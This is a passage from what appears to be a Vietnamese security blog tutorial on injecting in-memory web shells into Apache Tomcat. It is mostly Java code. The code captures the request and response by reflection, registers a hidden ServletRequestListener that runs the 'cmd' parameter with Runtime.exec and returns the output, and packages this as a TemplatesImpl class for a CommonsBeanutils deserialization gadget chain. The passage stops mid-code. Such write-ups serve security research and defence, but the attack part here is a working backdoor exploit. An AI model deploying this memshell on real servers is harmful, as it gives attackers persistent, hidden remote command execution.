</span></span><span style="display:flex;"><span>                ServletResponse tmpResponse <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ThreadLocal<span style="color:#f92672">&lt;</span>ServletResponse<span style="color:#f92672">&gt;)</span> responseF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                response <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>ServletResponse<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>tmpResponse<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;response&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// ResponseFacade (fix tomcat 9)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// tomcat 10, 11
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                Thread<span style="color:#f92672">[]</span> threads <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Thread<span style="color:#f92672">[])</span> getFieldValueByObj<span style="color:#f92672">(</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">currentThread</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getThreadGroup</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;threads&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Thread t <span style="color:#f92672">:</span> threads<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    Runnable target <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        target <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Runnable<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>t<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;target&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception pass<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>                    Class pollerCls <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.tomcat.util.net.NioEndpoint$Poller&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>target <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> target<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>pollerCls<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        Set<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> nio <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Set<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;)</span> invokeMethodByClsName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.tomcat.util.net.AbstractEndpoint&#34;</span><span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>                                getFieldValueByObj<span style="color:#f92672">(</span>target<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;this$0&#34;</span><span style="color:#f92672">),</span> <span style="color:#e6db74">&#34;getConnections&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// this$0 ~ outer class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">// current open connections, we need to get exact one we make
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Object n<span style="color:#f92672">:</span> nio<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                            Object req <span style="color:#f92672">=</span> getFieldValueByObj<span style="color:#f92672">(</span>getFieldValueByObj<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>                                    invokeMethodByClsName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.tomcat.util.net.SocketWrapperBase&#34;</span><span style="color:#f92672">,</span> n<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getSocket&#34;</span><span style="color:#f92672">),</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e6db74">&#34;appReadBufHandler&#34;</span><span style="color:#f92672">),</span> <span style="color:#e6db74">&#34;request&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                            Request tmpReq <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Request<span style="color:#f92672">)</span> invokeMethodByClsName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.coyote.Request&#34;</span><span style="color:#f92672">,</span> req<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getNote&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>tmpReq<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                                request <span style="color:#f92672">=</span> tmpReq<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                                response <span style="color:#f92672">=</span> tmpReq<span style="color:#f92672">.</span><span style="color:#a6e22e">getResponse</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            StandardContext stdCtx <span style="color:#f92672">=</span> getStdCtx<span style="color:#f92672">(</span>request<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            stdCtx<span style="color:#f92672">.</span><span style="color:#a6e22e">addApplicationEventListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> EventListener<span style="color:#f92672">(</span>response<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;inject success!&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Lưu ý khi build payload cần add thêm thư viện <code>tomcat-catalina</code> ngoài <code>servlet-api</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.tomcat<span style="color:#f92672">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>tomcat-catalina<span style="color:#f92672">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>${tomcat.version}<span style="color:#f92672">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;scope&gt;</span>provided<span style="color:#f92672">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
</span></span></code></pre></div><h3 id="inject-memshell-via-deser-gadget-chain">inject memshell via deser gadget chain</h3>
<p>Phần tiếp theo sẽ nhúng code inject memshell vào payload deser từ sink <code>TemplateImpl</code> làm ví dụ. Mình đã có bài viết khá chi tiết về các chain có sink <code>TemplateImpl</code> <a href="https://devme4f.github.io/posts/2023/java-deserialization-p1/">tại đây</a>. Bài viết sẽ lấy ví dụ gadget chain CommonsBeanutils:</p>
<p>Class <code>TemplateImpl</code> là bytecode được load:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilTemplateImpl</span> <span style="color:#66d9ef">extends</span> AbstractTranslet <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> SerializationHandler<span style="color:#f92672">[]</span> handlers<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> DTMAxisIterator iterator<span style="color:#f92672">,</span> SerializationHandler handler<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EvilTemplateImpl</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;EvilTemplatesImpl executed1&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;calc&#34;</span><span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Sau chỉnh sửa <code>ListenerTemplatesImpl</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ListenerTemplatesImpl</span> <span style="color:#66d9ef">extends</span> AbstractTranslet <span style="color:#66d9ef">implements</span> ServletRequestListener <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> SerializationHandler<span style="color:#f92672">[]</span> handlers<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> DTMAxisIterator iterator<span style="color:#f92672">,</span> SerializationHandler handler<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Field <span style="color:#a6e22e">getStaticFieldModified</span><span style="color:#f92672">(</span>String clsName<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span>clsName<span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Field modifiersF <span style="color:#f92672">=</span> Field<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;modifiers&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        modifiersF<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        modifiersF<span style="color:#f92672">.</span><span style="color:#a6e22e">setInt</span><span style="color:#f92672">(</span>f<span style="color:#f92672">,</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">getModifiers</span><span style="color:#f92672">()</span> <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>Modifier<span style="color:#f92672">.</span><span style="color:#a6e22e">FINAL</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    Object <span style="color:#a6e22e">getFieldValueByObj</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// in case method in parent class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Object <span style="color:#a6e22e">invokeMethodByClsName</span><span style="color:#f92672">(</span>String clsName<span style="color:#f92672">,</span> Object obj<span style="color:#f92672">,</span> String name<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;?&gt;...</span> params<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Method m <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span>clsName<span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span>name<span style="color:#f92672">,</span> params<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        m<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>params<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> m<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">);</span> <span style="color:#75715e">// just4getNote
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> m<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> params<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    StandardContext <span style="color:#a6e22e">getStdCtx</span><span style="color:#f92672">(</span>ServletRequest request<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Field appCtxFacadeField <span style="color:#f92672">=</span> ApplicationContextFacade<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;context&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            appCtxFacadeField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field appCtxField <span style="color:#f92672">=</span> ApplicationContext<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;context&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            appCtxField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>StandardContext<span style="color:#f92672">)</span> appCtxField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>appCtxFacadeField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletContext</span><span style="color:#f92672">()));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String pwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> ServletResponse response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ListenerTemplatesImpl</span><span style="color:#f92672">(</span>ServletResponse response<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">requestDestroyed</span><span style="color:#f92672">(</span>ServletRequestEvent sre<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">requestInitialized</span><span style="color:#f92672">(</span>ServletRequestEvent sre<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[debug] request Initialized&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            HttpServletRequest request <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HttpServletRequest<span style="color:#f92672">)</span> sre<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletRequest</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                Process ps <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>                BufferedReader br <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> InputStreamReader<span style="color:#f92672">(</span>ps<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()));</span>
</span></span><span style="display:flex;"><span>                ServletOutputStream out <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                String s <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                String output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>s <span style="color:#f92672">=</span> br<span style="color:#f92672">.</span><span style="color:#a6e22e">readLine</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    output <span style="color:#f92672">+=</span> s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                out<span style="color:#f92672">.</span><span style="color:#a6e22e">print</span><span style="color:#f92672">(</span>output<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                out<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                out<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ListenerTemplatesImpl</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1231</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        ServletRequest request <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        ServletResponse response <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        Field sameF <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            sameF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;WRAP_SAME_OBJECT&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field requestF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;lastServicedRequest&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field responseF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;lastServicedResponse&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span><span style="color:#66d9ef">boolean</span><span style="color:#f92672">)</span>sameF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                sameF<span style="color:#f92672">.</span><span style="color:#a6e22e">setBoolean</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                requestF<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span>  ThreadLocal <span style="color:#f92672">&lt;&gt;());</span>
</span></span><span style="display:flex;"><span>                responseF<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span>  ThreadLocal <span style="color:#f92672">&lt;&gt;());</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
